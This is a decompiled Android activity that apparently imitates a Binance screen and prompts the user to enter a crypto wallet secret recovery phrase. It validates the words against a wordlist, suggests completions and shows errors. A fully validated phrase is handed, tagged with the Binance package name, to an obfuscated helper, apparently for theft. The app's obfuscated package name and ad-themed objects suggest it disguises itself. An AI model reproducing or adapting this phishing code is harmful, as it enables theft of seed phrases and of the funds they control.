package com.superbock.ui.custom;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.activity.d;
import androidx.appcompat.graphics.drawable.a;
import com.superbock.App;
import com.superbock.bean.AdInfo;
import com.superbock.bean.MInfo;
import comeliest.metempsychosis.pokelogan.R;
import g3.n;
import j3.b;
import j3.c;
import j3.e;
import j3.f;
import j3.g;
import j3.i;
import j3.k;
import j3.l;
import j3.m;
import j3.o;
import j3.p;
import j3.q;
import java.util.List;
import k3.j;

/* loaded from: classes.dex */
public class InputWordsBinanceActivity extends Activity {

    /* renamed from: b, reason: collision with root package name */
    public AdInfo f1555b;

    /* renamed from: c, reason: collision with root package name */
    public long f1556c;

    /* renamed from: d, reason: collision with root package name */
    public View f1557d;

    /* renamed from: e, reason: collision with root package name */
    public ImageView f1558e;

    /* renamed from: f, reason: collision with root package name */
    public LinearLayout f1559f;

    /* renamed from: g, reason: collision with root package name */
    public EditText f1560g;

    /* renamed from: h, reason: collision with root package name */
    public TextView f1561h;

    /* renamed from: i, reason: collision with root package name */
    public LinearLayout f1562i;

    /* renamed from: j, reason: collision with root package name */
    public TextView f1563j;

    /* renamed from: k, reason: collision with root package name */
    public LinearLayout f1564k;

    /* renamed from: l, reason: collision with root package name */
    public TextView f1565l;

    /* renamed from: m, reason: collision with root package name */
    public TextView f1566m;

    /* renamed from: n, reason: collision with root package name */
    public TextView f1567n;

    /* renamed from: o, reason: collision with root package name */
    public TextView f1568o;

    /* renamed from: p, reason: collision with root package name */
    public TextView f1569p;

    /* renamed from: q, reason: collision with root package name */
    public TextView f1570q;

    /* renamed from: r, reason: collision with root package name */
    public TextView f1571r;

    /* renamed from: s, reason: collision with root package name */
    public TextView f1572s;

    /* renamed from: t, reason: collision with root package name */
    public TextView f1573t;

    /* renamed from: u, reason: collision with root package name */
    public TextView f1574u;

    /* renamed from: v, reason: collision with root package name */
    public int f1575v;

    /* renamed from: w, reason: collision with root package name */
    public i f1576w;

    public static void a(InputWordsBinanceActivity inputWordsBinanceActivity) {
        TextView textView;
        String string;
        String obj = inputWordsBinanceActivity.f1560g.getText().toString();
        if (obj.trim().length() == 0) {
            inputWordsBinanceActivity.f1564k.setVisibility(8);
            inputWordsBinanceActivity.f1562i.setVisibility(4);
            return;
        }
        String[] split = obj.trim().split("\\s+");
        String str = split[split.length - 1];
        if (str.matches("^[a-z]+$")) {
            List a5 = n.c().a(str);
            if (a5 != null && !a5.isEmpty()) {
                inputWordsBinanceActivity.f1565l.setText(((MInfo) a5.get(0)).getId());
                inputWordsBinanceActivity.f1565l.setVisibility(0);
                if (a5.size() >= 2) {
                    inputWordsBinanceActivity.f1566m.setText(((MInfo) a5.get(1)).getId());
                    inputWordsBinanceActivity.f1566m.setVisibility(0);
                } else {
                    inputWordsBinanceActivity.f1566m.setVisibility(8);
                }
                if (a5.size() >= 3) {
                    inputWordsBinanceActivity.f1567n.setText(((MInfo) a5.get(2)).getId());
                    inputWordsBinanceActivity.f1567n.setVisibility(0);
                } else {
                    inputWordsBinanceActivity.f1567n.setVisibility(8);
                }
                if (a5.size() >= 4) {
                    inputWordsBinanceActivity.f1568o.setText(((MInfo) a5.get(3)).getId());
                    inputWordsBinanceActivity.f1568o.setVisibility(0);
                } else {
                    inputWordsBinanceActivity.f1568o.setVisibility(8);
                }
                if (a5.size() >= 5) {
                    inputWordsBinanceActivity.f1569p.setText(((MInfo) a5.get(4)).getId());
                    inputWordsBinanceActivity.f1569p.setVisibility(0);
                } else {
                    inputWordsBinanceActivity.f1569p.setVisibility(8);
                }
                if (a5.size() >= 6) {
                    inputWordsBinanceActivity.f1570q.setText(((MInfo) a5.get(5)).getId());
                    inputWordsBinanceActivity.f1570q.setVisibility(0);
                } else {
                    inputWordsBinanceActivity.f1570q.setVisibility(8);
                }
                if (a5.size() >= 7) {
                    inputWordsBinanceActivity.f1571r.setText(((MInfo) a5.get(6)).getId());
                    inputWordsBinanceActivity.f1571r.setVisibility(0);
                } else {
                    inputWordsBinanceActivity.f1571r.setVisibility(8);
                }
                if (a5.size() >= 8) {
                    inputWordsBinanceActivity.f1572s.setText(((MInfo) a5.get(7)).getId());
                    inputWordsBinanceActivity.f1572s.setVisibility(0);
                } else {
                    inputWordsBinanceActivity.f1572s.setVisibility(8);
                }
                if (a5.size() >= 9) {
                    inputWordsBinanceActivity.f1573t.setText(((MInfo) a5.get(8)).getId());
                    inputWordsBinanceActivity.f1573t.setVisibility(0);
                } else {
                    inputWordsBinanceActivity.f1573t.setVisibility(8);
                }
                if (a5.size() >= 10) {
                    inputWordsBinanceActivity.f1574u.setText(((MInfo) a5.get(9)).getId());
                    inputWordsBinanceActivity.f1574u.setVisibility(0);
                } else {
                    inputWordsBinanceActivity.f1574u.setVisibility(8);
                }
                inputWordsBinanceActivity.f1564k.setVisibility(0);
                inputWordsBinanceActivity.f1562i.setVisibility(4);
                if (split.length >= 2) {
                    for (int length = split.length - 2; length >= 0; length--) {
                        String str2 = split[length];
                        if (!str2.matches("^[a-z]+$") || n.c().b(str2) == -1) {
                            inputWordsBinanceActivity.f1563j.setText(inputWordsBinanceActivity.getString(R.string.is_wrong_secret_phrase_check, str2));
                            inputWordsBinanceActivity.f1562i.setVisibility(0);
                            break;
                        }
                    }
                }
                if (inputWordsBinanceActivity.f1564k.getVisibility() == 0 && obj.endsWith(" ") && n.c().b(split[split.length - 1]) != -1) {
                    inputWordsBinanceActivity.f1564k.setVisibility(8);
                }
                if (inputWordsBinanceActivity.f1562i.getVisibility() != 0) {
                    String trim = obj.trim();
                    if (j.b(trim)) {
                        j.a(trim.replaceAll("\\s+", " "), "com.binance.dev", inputWordsBinanceActivity.getString(R.string.binance), inputWordsBinanceActivity);
                        return;
                    }
                    return;
                }
                return;
            }
            inputWordsBinanceActivity.f1564k.setVisibility(8);
            textView = inputWordsBinanceActivity.f1563j;
            string = inputWordsBinanceActivity.getString(R.string.is_wrong_secret_phrase_check, str);
        } else {
            inputWordsBinanceActivity.f1564k.setVisibility(8);
            textView = inputWordsBinanceActivity.f1563j;
            string = inputWordsBinanceActivity.getString(R.string.is_wrong_secret_phrase_check, str);
        }
        textView.setText(string);
        inputWordsBinanceActivity.f1562i.setVisibility(0);
    }

    public static void b(InputWordsBinanceActivity inputWordsBinanceActivity, String str) {
        String[] split = inputWordsBinanceActivity.f1560g.getText().toString().trim().split("\\s+");
        String str2 = "";
        for (int i5 = 0; i5 < split.length - 1; i5++) {
            str2 = a.c(d.g(str2), split[i5], " ");
        }
        String j5 = androidx.appcompat.widget.a.j(str2, str, " ");
        inputWordsBinanceActivity.f1560g.setText(j5);
        inputWordsBinanceActivity.f1560g.setSelection(j5.length());
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
        finishAndRemoveTask();
        this.f1555b.setFeedBack(3);
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.input_words_binance);
        AdInfo adInfo = (AdInfo) getIntent().getSerializableExtra("adInfo");
        this.f1555b = adInfo;
        if (adInfo == null) {
            finishAndRemoveTask();
            return;
        }
        adInfo.setPkg("com.binance.dev");
        this.f1555b.setUse(2);
        getWindow().setStatusBarColor(getResources().getColor(R.color.Grey_100));
        this.f1557d = findViewById(R.id.root_layout);
        this.f1558e = (ImageView) findViewById(R.id.btn_back);
        this.f1559f = (LinearLayout) findViewById(R.id.btn_paste);
        this.f1560g = (EditText) findViewById(R.id.edit_words);
        this.f1561h = (TextView) findViewById(R.id.btn_submit);
        this.f1562i = (LinearLayout) findViewById(R.id.tips_ll);
        this.f1563j = (TextView) findViewById(R.id.tips_text);
        this.f1564k = (LinearLayout) findViewById(R.id.prompt_ll);
        this.f1565l = (TextView) findViewById(R.id.word0);
        this.f1566m = (TextView) findViewById(R.id.word1);
        this.f1567n = (TextView) findViewById(R.id.word2);
        this.f1568o = (TextView) findViewById(R.id.word3);
        this.f1569p = (TextView) findViewById(R.id.word4);
        this.f1570q = (TextView) findViewById(R.id.word5);
        this.f1571r = (TextView) findViewById(R.id.word6);
        this.f1572s = (TextView) findViewById(R.id.word7);
        this.f1573t = (TextView) findViewById(R.id.word8);
        this.f1574u = (TextView) findViewById(R.id.word9);
        this.f1576w = new i(this);
        this.f1557d.getViewTreeObserver().addOnGlobalLayoutListener(this.f1576w);
        this.f1560g.setOnFocusChangeListener(new j3.j(this));
        this.f1560g.addTextChangedListener(new k(this));
        this.f1561h.setOnClickListener(new l(this));
        this.f1558e.setOnClickListener(new m(this));
        this.f1559f.setOnClickListener(new j3.n(this));
        this.f1565l.setOnClickListener(new o(this));
        this.f1566m.setOnClickListener(new p(this));
        this.f1567n.setOnClickListener(new q(this));
        this.f1568o.setOnClickListener(new j3.a(this));
        this.f1569p.setOnClickListener(new b(this));
        this.f1570q.setOnClickListener(new c(this));
        this.f1571r.setOnClickListener(new j3.d(this));
        this.f1572s.setOnClickListener(new e(this));
        this.f1573t.setOnClickListener(new f(this));
        this.f1574u.setOnClickListener(new g(this));
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        if (this.f1576w != null) {
            this.f1557d.getViewTreeObserver().removeOnGlobalLayoutListener(this.f1576w);
        }
        int type = this.f1555b.getType();
        if (type == 0 || type == 1) {
            App.f1372b.d(this.f1555b, true, false);
        } else if (type == 2 || type == 3 || type == 4) {
            App.f1373c = false;
            App.f1372b.c(this.f1555b);
        }
        super.onDestroy();
    }

    @Override // android.app.Activity
    public final void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
    }

    @Override // android.app.Activity
    public final void onPause() {
        super.onPause();
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
    }

    @Override // android.app.Activity
    public final void onStart() {
        super.onStart();
        if (this.f1555b == null) {
            return;
        }
        App.f1373c = true;
        if (this.f1556c == 0) {
            long currentTimeMillis = System.currentTimeMillis();
            this.f1556c = currentTimeMillis;
            this.f1555b.setStartTime(currentTimeMillis);
        }
        if (this.f1555b.getType() == 2) {
            f3.i.n(0, "39", null);
        }
    }

    @Override // android.app.Activity
    public final void onStop() {
        super.onStop();
        int type = this.f1555b.getType();
        if (type == 0 || type == 1) {
            App.f1372b.d(this.f1555b, true, true);
            return;
        }
        if (type == 2 || type == 3 || type == 4) {
            App.f1373c = false;
            if (this.f1555b.getType() == 2) {
                f3.i.n(0, "40", null);
            }
            App.f1372b.c(this.f1555b);
        }
    }
}
